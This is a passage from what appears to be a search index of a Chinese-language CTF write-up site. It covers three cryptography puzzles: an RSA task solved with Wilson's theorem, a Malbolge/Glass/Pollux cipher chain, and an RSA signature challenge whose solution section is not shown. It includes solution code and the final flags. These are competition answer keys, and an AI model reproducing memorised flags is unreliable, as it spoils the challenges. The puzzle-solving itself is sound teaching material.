y)\\) \\(y! * (y+1) * ... * (x-2) * (x-1) \\equiv -1 \\,(mod \\, x)\\) \\(y! \\equiv -[(y+1) * ... * (x-2) * (x-1)]^{-1} \\, (mod \\, x)\\) \u91cd\u5199 get_p() \u51fd\u6570\uff0c\u6c42\u9006\u5143\u677f\u5b50\u6307\u8def -> easy_RSA 1 2 3 4 5 6 7 8 9 def get_p (): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 multi = 1 for i in range ( y + 1 , x ): multi = ( i * multi ) % x factor = ( x - modinv ( multi , x )) % x value_p = sympy . nextprime ( factor ) return value_p q \u503c\u6c42\u89e3\u7c7b\u4f3c\u4e8e RSA \u89e3\u5bc6\uff0c\u5148\u4f7f\u7528 prevprime \u5012\u63a8 value \u83b7\u5f97 \\(n\\) \u7684\u6240\u6709\u56e0\u6570\uff0c\u4ece\u800c\u83b7\u5f97 \\(\\varphi(n)\\) \uff0c\u8fdb\u800c\u6c42\u51fa \\(d\\) 1 2 3 4 5 6 7 8 9 10 11 12 def get_real_q (): value = [ 80096058210213458444437404275177554701604739094679033012396452382975889905967 ] for i in range ( 1 , 10 ): value . append ( sympy . prevprime ( value [ i - 1 ])) value . reverse () n = fn = 1 for i in range ( 10 ): fn *= ( value [ i ] - 1 ) n *= value [ i ] d = modinv ( e , fn ) value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 return sympy . nextprime ( pow ( value_q , d , n )) p \u3001 q \u548c e \u90fd\u5f97\u5230\u4e86\uff0c\u89e3\u5bc6\u5c31\u662f\u5206\u5206\u949f\u7684\u4e8b\u5566 XD 1 2 3 4 5 fn = ( p - 1 ) * ( q - 1 ) d = modinv ( e , fn ) print ( long_to_bytes ( pow ( c , d , p * q ))) # b'flag{CRYPT0_1s_Interesting!}'","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/ustc_easy_rsa/#_3","text":"Wilson's theorem - Wikipedia","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/weird_programmer/","text":"\u9898\u76ee \u00b6 I bet my friend who is a terrible poet and a really weird programmer that i can solve any encryption he makes in max 3 tries but i may have underestimated him. Can you help me win this bet? hint : Try underscore ( _ ) between the words poem.txt When you have broken the glass and stepped into the eighth circle of hell, you will find yourself under the pollux's spell and after that you will be able to tell, All's well that end's well Weird_Programmer.txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 {M[m(_o)O!\"'&BA@?>~<543Wxwvutsrqponmlkjihgfe#zyx}|{zyrwp6WVUTSRQglejihgfe^$#DCBA@?>=<RW VUTMRQJIm0/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYuWmrqpinmlkjc )gf_d]#DCBA@?UZYXWPUTSRKoONGLKDh+*)('&%$@?8=<5:9810Tut210/.-,+k#Ghgfedcba`_^ ]\\[ZYXWmlkjonmlkjib(fHdcb[!_X]VzZSRvVOsMLQJONMFEiIHAFE>bB;:?87[|{zyxwvutsrqp onmlk)i'&%$#\"!~}v<]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('=BA :?>=<;:92V05.3,10)Mnmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876 543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIH GFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[Z YXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponml kjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~ }|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:98765432 10/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFED CBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWV UTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjih gfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{z yxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/. -,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@ ?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSR QPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfed cba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwv utsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+* )('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=< ;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPON MLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba` _^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?[ZSXWVUTSRQPONMFjJCHA@d>CBA@?8\\}|{zyxwvutsr qponmlkji!&%$#\"!~w|u;yxqputsrk1oQmle+iha'_dcb[Z~A@?>=<;:9876543210/.-,+*)('= <A@?>=<543W7654t210)Mnmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:98 76543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJ IHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\ [ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqpon mlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\" !~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:987654 3210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGF EDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYX WVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkj ihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}| {zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210 /.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCB A@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUT SRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgf edcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyx wvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-, +*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?> =<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQP ONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcb a`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?[ZSXWVUTSRQPONMFjJCg*)('&%$#\"!~}|{zyxwvut srq/.-,+k)\"'&}|B\"!~`|u;\\[ZYXWVUTSRQPONMLKgfe^cba`Y^]Vz=<;:9876543210/.-,+*)( '&%$#\"!~}|{zyxwvutsrqponmlkjihgf|#\"y~}|{zyxwp6WVUTSRQmlkjibg`e^$Ea`Y}]\\[Z<XW POs6543210/.-,+*)('&%$:?8=6;:9870Tu-2+*NMnmlkjih&%$#\"!~}|u;\\[ZYXWVUTSRQPONML KJIHdcba`Y^]V[TxXWVUTMRQJnHl/.-,+*)('&%$#\"!~}|{3816543210)Mnm+*#(!&%$#z@x}v< tyr8YXWVUTSRQPONMLKJIHGFEa`_^]V[ZSXQuUTSRQ3INGkKJIHG@?c&%$#\"!~}|{zyxwvutsr0/ .-,+*)(h&}C#\"bx>|{tyrqvun4rqjonmle+LKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$ #\"!~}|{zyxwvutsrqponmlkjihgfedcba`|{zyxwvunslk1Rnmlkjiha'HGFEDCBA@?>=<;:9876 543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqpo-,l*)('~%|#\"y?`_^]\\[ZYXWVUTSRQPONMLKJIH GcEa`Y^]V[TSRv9876543210/.-,+*)('=B;@?>=<;:3W7w543,Pqponml$#(!~%$#\"!x>_{zyxq 7XWVUTSingledihgf_%c\\aZ~^]?UZYXWPtTMLp3INGk.-,+*)E'=B;:?>=<5Yz876543,Pqponml k)('&%$#\"!x>_^]yxwvutsrk1RQPONMLKgfedcba`YXW{[ZYXWPUTMqQJImMFKJIHAe('=B;@?>= <;4XWV0543210)M-&+*)\"Fgfedcba`_^]\\[ZYXWVrqSinglkjiha'HGFEDCBA@?>=<;:98765432 10/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYutmrkponmledc)afe^$E[ Z_^]VzTYRWVONrLQPONGLKDh+*)('&<A@?>=<;:92VC\"(_o)o.?]} \u89e3\u9898\u601d\u8def \u00b6 \u6beb\u65e0\u7591\u95ee\uff0c\u7ebf\u7d22\u90fd\u85cf\u5728 poem.txt \u4e2d XD \u6700\u5148\u6ce8\u610f\u5230\u7684\u662f pollux \uff0c\u7136\u540e\u4e5f\u987a\u5229\u5730\u627e\u5230\u4e86 Pollux Cipher \uff0c\u4e0d\u8fc7\u770b\u5bc6\u6587\u8fd9\u4e48\u591a\u6807\u70b9\u7b26\u53f7\uff0c\u663e\u7136\u6ca1\u6709\u5355\u7eaf\u7528 Pollux \u52a0\u5bc6 \u6839\u636e Difficult Programming Language \u7684\u7ecf\u9a8c\u63a8\u6d4b\u5e94\u8be5\u8fd8\u4f7f\u7528\u4e86 Malbolge\uff0c\u901a\u8fc7\u641c\u7d22\u5f97\u5230\u8bc1\u5b9e Malbolge is a public domain esoteric programming language invented by Ben Olmstead in 1998, named after the eighth circle of hell in Dante's Inferno, the Malebolge. \u968f\u540e\u76f4\u63a5\u628a\u4ee3\u7801\u4ecd\u7ed9\u4e86 Malbolge - interpreter online \uff0c\u9047\u5230\u4e86 Invalid char \u7684\u9519\u8bef\uff0c\u8fd8\u662f\u6839\u636e Difficult Programming Language \u7684\u7ecf\u9a8c\uff0c\u5c31\u5bf9\u7740\u9519\u8bef\u4f4d\u7f6e\u4e0a\u624b\u6539\u4ee3\u7801\u4e86 \ud83d\ude49 \u6ce2\u6298\u5730\u8dd1\u51fa\u4e86\u7ed3\u679c\uff08\u67d0\u6b21\u4e0d\u5c0f\u5fc3\u5220\u591a\u4e86\uff0c\u4f46\u8fd0\u884c\u6ca1\u6709\u95ee\u9898\uff0c\u53ea\u662f\u8f93\u51fa\u5b57\u7b26\u4e32\u5c11\u4e86\u4e00\u4e9b\uff09\uff1a AR11J65VQOV3ZXSOTWS7FEGJH84C5BDMGOU5Q86N0LBBRJTH4KJLG41WRVTFYELAQATJIPN4LQXFJWUQCCC12MRXITO3 Pollux \u89e3\u5bc6\u53d6\u5f97 Flag\uff1a 1 T I S W 3 1 R D N 0 T T 0 B 3 W 3 1 R D => vishwaCTF{1T_IS_W31RD_N0T_T0_B3_W31RD} \u5b9e\u9645\u4e0a\uff0c\u5728 Malbolge \u4e4b\u524d\uff0c\u8fd8\u6709\u4e00\u6b65\uff0c\u5c31\u662f Glass \u03a3\u03a3\u03a3(\u03a6 \u03c9\u03a6||\u00a1) \u5bf9\u6bd4 Glass \u6253\u5370 Hello World! \u7684\u7a0b\u5e8f\u548c\u9898\u76ee\u4ee3\u7801\uff0cMalbolge \u7684\u4ee3\u7801\u5c31\u662f\u7531 Glass \u7a0b\u5e8f\u6253\u5370\u7684\uff0c\u524d\u9762\u7684\u64cd\u4f5c\u6070\u597d\u628a Malbolge \u7684\u90e8\u5206\u63d0\u53d6\u51fa\u6765\u4e86 \ud83e\udd73 1 {M[m(_o)O!\"Hello World!\"(_o)o.?]} \u53c2\u8003\u8d44\u6599 \u00b6 Glass - Esolang","title":"Weird Programmer"},{"location":"crypto/weird_programmer/#_1","text":"I bet my friend who is a terrible poet and a really weird programmer that i can solve any encryption he makes in max 3 tries but i may have underestimated him. Can you help me win this bet? hint : Try underscore ( _ ) between the words poem.txt When you have broken the glass and stepped into the eighth circle of hell, you will find yourself under the pollux's spell and after that you will be able to tell, All's well that end's well Weird_Programmer.txt 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 {M[m(_o)O!\"'&BA@?>~<543Wxwvutsrqponmlkjihgfe#zyx}|{zyrwp6WVUTSRQglejihgfe^$#DCBA@?>=<RW VUTMRQJIm0/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYuWmrqpinmlkjc )gf_d]#DCBA@?UZYXWPUTSRKoONGLKDh+*)('&%$@?8=<5:9810Tut210/.-,+k#Ghgfedcba`_^ ]\\[ZYXWmlkjonmlkjib(fHdcb[!_X]VzZSRvVOsMLQJONMFEiIHAFE>bB;:?87[|{zyxwvutsrqp onmlk)i'&%$#\"!~}v<]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('=BA :?>=<;:92V05.3,10)Mnmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876 543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIH GFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[Z YXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponml kjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~ }|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:98765432 10/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFED CBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWV UTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjih gfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{z yxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/. -,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@ ?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSR QPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfed cba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwv utsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+* )('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=< ;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPON MLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba` _^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?[ZSXWVUTSRQPONMFjJCHA@d>CBA@?8\\}|{zyxwvutsr qponmlkji!&%$#\"!~w|u;yxqputsrk1oQmle+iha'_dcb[Z~A@?>=<;:9876543210/.-,+*)('= <A@?>=<543W7654t210)Mnmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:98 76543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJ IHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\ [ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqpon mlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\" !~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:987654 3210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGF EDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYX WVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkj ihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}| {zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210 /.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCB A@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUT SRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgf edcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyx wvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=<;:9876543210/.-, +*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?> =<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQP ONMLKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcb a`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?[ZSXWVUTSRQPONMFjJCg*)('&%$#\"!~}|{zyxwvut srq/.-,+k)\"'&}|B\"!~`|u;\\[ZYXWVUTSRQPONMLKgfe^cba`Y^]Vz=<;:9876543210/.-,+*)( '&%$#\"!~}|{zyxwvutsrqponmlkjihgf|#\"y~}|{zyxwp6WVUTSRQmlkjibg`e^$Ea`Y}]\\[Z<XW POs6543210/.-,+*)('&%$:?8=6;:9870Tu-2+*NMnmlkjih&%$#\"!~}|u;\\[ZYXWVUTSRQPONML KJIHdcba`Y^]V[TxXWVUTMRQJnHl/.-,+*)('&%$#\"!~}|{3816543210)Mnm+*#(!&%$#z@x}v< tyr8YXWVUTSRQPONMLKJIHGFEa`_^]V[ZSXQuUTSRQ3INGkKJIHG@?c&%$#\"!~}|{zyxwvutsr0/ .-,+*)(h&}C#\"bx>|{tyrqvun4rqjonmle+LKJIHGFEDCBA@?>=<;:9876543210/.-,+*)('&%$ #\"!~}|{zyxwvutsrqponmlkjihgfedcba`|{zyxwvunslk1Rnmlkjiha'HGFEDCBA@?>=<;:9876 543210/.-,+*)('&%$#\"!~}|{zyxwvutsrqpo-,l*)('~%|#\"y?`_^]\\[ZYXWVUTSRQPONMLKJIH GcEa`Y^]V[TSRv9876543210/.-,+*)('=B;@?>=<;:3W7w543,Pqponml$#(!~%$#\"!x>_{zyxq 7XWVUTSingledihgf_%c\\aZ~^]?UZYXWPtTMLp3INGk.-,+*)E'=B;:?>=<5Yz876543,Pqponml k)('&%$#\"!x>_^]yxwvutsrk1RQPONMLKgfedcba`YXW{[ZYXWPUTMqQJImMFKJIHAe('=B;@?>= <;4XWV0543210)M-&+*)\"Fgfedcba`_^]\\[ZYXWVrqSinglkjiha'HGFEDCBA@?>=<;:98765432 10/.-,+*)('&%$#\"!~}|{zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYutmrkponmledc)afe^$E[ Z_^]VzTYRWVONrLQPONGLKDh+*)('&<A@?>=<;:92VC\"(_o)o.?]}","title":"\u9898\u76ee"},{"location":"crypto/weird_programmer/#_2","text":"\u6beb\u65e0\u7591\u95ee\uff0c\u7ebf\u7d22\u90fd\u85cf\u5728 poem.txt \u4e2d XD \u6700\u5148\u6ce8\u610f\u5230\u7684\u662f pollux \uff0c\u7136\u540e\u4e5f\u987a\u5229\u5730\u627e\u5230\u4e86 Pollux Cipher \uff0c\u4e0d\u8fc7\u770b\u5bc6\u6587\u8fd9\u4e48\u591a\u6807\u70b9\u7b26\u53f7\uff0c\u663e\u7136\u6ca1\u6709\u5355\u7eaf\u7528 Pollux \u52a0\u5bc6 \u6839\u636e Difficult Programming Language \u7684\u7ecf\u9a8c\u63a8\u6d4b\u5e94\u8be5\u8fd8\u4f7f\u7528\u4e86 Malbolge\uff0c\u901a\u8fc7\u641c\u7d22\u5f97\u5230\u8bc1\u5b9e Malbolge is a public domain esoteric programming language invented by Ben Olmstead in 1998, named after the eighth circle of hell in Dante's Inferno, the Malebolge. \u968f\u540e\u76f4\u63a5\u628a\u4ee3\u7801\u4ecd\u7ed9\u4e86 Malbolge - interpreter online \uff0c\u9047\u5230\u4e86 Invalid char \u7684\u9519\u8bef\uff0c\u8fd8\u662f\u6839\u636e Difficult Programming Language \u7684\u7ecf\u9a8c\uff0c\u5c31\u5bf9\u7740\u9519\u8bef\u4f4d\u7f6e\u4e0a\u624b\u6539\u4ee3\u7801\u4e86 \ud83d\ude49 \u6ce2\u6298\u5730\u8dd1\u51fa\u4e86\u7ed3\u679c\uff08\u67d0\u6b21\u4e0d\u5c0f\u5fc3\u5220\u591a\u4e86\uff0c\u4f46\u8fd0\u884c\u6ca1\u6709\u95ee\u9898\uff0c\u53ea\u662f\u8f93\u51fa\u5b57\u7b26\u4e32\u5c11\u4e86\u4e00\u4e9b\uff09\uff1a AR11J65VQOV3ZXSOTWS7FEGJH84C5BDMGOU5Q86N0LBBRJTH4KJLG41WRVTFYELAQATJIPN4LQXFJWUQCCC12MRXITO3 Pollux \u89e3\u5bc6\u53d6\u5f97 Flag\uff1a 1 T I S W 3 1 R D N 0 T T 0 B 3 W 3 1 R D => vishwaCTF{1T_IS_W31RD_N0T_T0_B3_W31RD} \u5b9e\u9645\u4e0a\uff0c\u5728 Malbolge \u4e4b\u524d\uff0c\u8fd8\u6709\u4e00\u6b65\uff0c\u5c31\u662f Glass \u03a3\u03a3\u03a3(\u03a6 \u03c9\u03a6||\u00a1) \u5bf9\u6bd4 Glass \u6253\u5370 Hello World! \u7684\u7a0b\u5e8f\u548c\u9898\u76ee\u4ee3\u7801\uff0cMalbolge \u7684\u4ee3\u7801\u5c31\u662f\u7531 Glass \u7a0b\u5e8f\u6253\u5370\u7684\uff0c\u524d\u9762\u7684\u64cd\u4f5c\u6070\u597d\u628a Malbolge \u7684\u90e8\u5206\u63d0\u53d6\u51fa\u6765\u4e86 \ud83e\udd73 1 {M[m(_o)O!\"Hello World!\"(_o)o.?]}","title":"\u89e3\u9898\u601d\u8def"},{"location":"crypto/weird_programmer/#_3","text":"Glass - Esolang","title":"\u53c2\u8003\u8d44\u6599"},{"location":"crypto/x_factor/","text":"\u9898\u76ee \u00b6 Decrypt it! x_factor.md 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 I have generated a RSA-1024 key pair: * public key exponent: 0x10001 * public key modulus: 0xa9e7da28ebecf1f88efe012b8502122d70b167bdcfa11fd24429c23f27f55ee2cc3dcd7f337d0e630985152e114830423bfaf83f4f15d2d05826bf511c343c1b13bef744ff2232fb91416484be4e130a007a9b432225c5ead5a1faf02fa1b1b53d1adc6e62236c798f76695bb59f737d2701fe42f1fbf57385c29de12e79c5b3 Here are some known plain -> signature pairs I generated using my private key: * 0x945d86b04b2e7c7 -> 0x17bb21949d5a0f590c6126e26dc830b51d52b8d0eb4f2b69494a9f9a637edb1061bec153f0c1d9dd55b1ad0fd4d58c46e2df51d293cdaaf1f74d5eb2f230568304eebb327e30879163790f3f860ca2da53ee0c60c5e1b2c3964dbcf194c27697a830a88d53b6e0ae29c616e4f9826ec91f7d390fb42409593e1815dbe48f7ed4 * 0x5de2 -> 0x3ea73715787028b52796061fb887a7d36fb1ba1f9734e9fd6cb6188e087da5bfc26c4bfe1b4f0cbfa0d693d4ac0494efa58888e8415964c124f7ef293a8ee2bc403cad6e9a201cdd442c102b30009a3b63fa61cdd7b31ce9da03507901b49a654e4bb2b03979aea0fab3731d4e564c3c30c75aa1d079594723b60248d9bdde50 * 0xa16b201cdd42ad70da249 -> 0x9444e3fc71056d25489e5ce78c6c986c029f12b61f4f4b5cbd4a0ce6b999919d12c8872b8f2a8a7e91bd0f263a4ead8f2aa4f7e9fdb9096c2ea11f693f6aa73d6b9d5e351617d6f95849f9c73edabd6a6fde6cc2e4559e67b0e4a2ea8d6897b32675be6fc72a6172fd42a8a8e96adfc2b899015b73ff80d09c35909be0a6e13a * 0x6d993121ed46b -> 0x2b7a1c4a1a9e9f9179ab7b05dd9e0089695f895864b52c73bfbc37af3008e5c187518b56b9e819cc2f9dfdffdfb86b7cc44222b66d3ea49db72c72eb50377c8e6eb6f6cbf62efab760e4a697cbfdcdc47d1adc183cc790d2e86490da0705717e5908ad1af85c58c9429e15ea7c83ccf7d86048571d50bd721e5b3a0912bed7c * 0x726fa7a7 -> 0xa7d5548d5e4339176a54ae1b3832d328e7c512be5252dabd05afa28cd92c7932b7d1c582dc26a0ce4f06b1e96814ee362ed475ddaf30dd37af0022441b36f08ec8c7c4135d6174167a43fa34f587abf806a4820e4f74708624518044f272e3e1215404e65b0219d42a706e5c295b9bf0ee8b7b7f9b6a75d76be64cf7c27dfaeb * 0x31e828d97a0874cff -> 0x67832c41a913bcc79631780088784e46402a0a0820826e648d84f9cc14ac99f7d8c10cf48a6774388daabcc0546d4e1e8e345ee7fc60b249d95d953ad4d923ca3ac96492ba71c9085d40753cab256948d61aeee96e0fe6c9a0134b807734a32f26430b325df7b6c9f8ba445e7152c2bf86b4dfd4293a53a8d6f003bf8cf5dffd * 0x904a515 -> 0x927a6ecd74bb7c7829741d290bc4a1fd844fa384ae3503b487ed51dbf9f79308bb11238f2ac389f8290e5bcebb0a4b9e09eda084f27add7b1995eeda57eb043deee72bfef97c3f90171b7b91785c2629ac9c31cbdcb25d081b8a1abc4d98c4a1fd9f074b583b5298b2b6cc38ca0832c2174c96f2c629afe74949d97918cbee4a **What is the signature of 0x686178656c696f6e?** Take the least significant 16 bytes of the signature, encode them in lowercase hexadecimal and format it as `LINECTF{sig_lowest_16_bytes_hex}` to obtain the flag. E.g. the last signature from the list above would become `LINECTF{174c96f2c629afe74949d97918cbee4a}` . \u89e3\u9898\u601d\u8def \u00b6 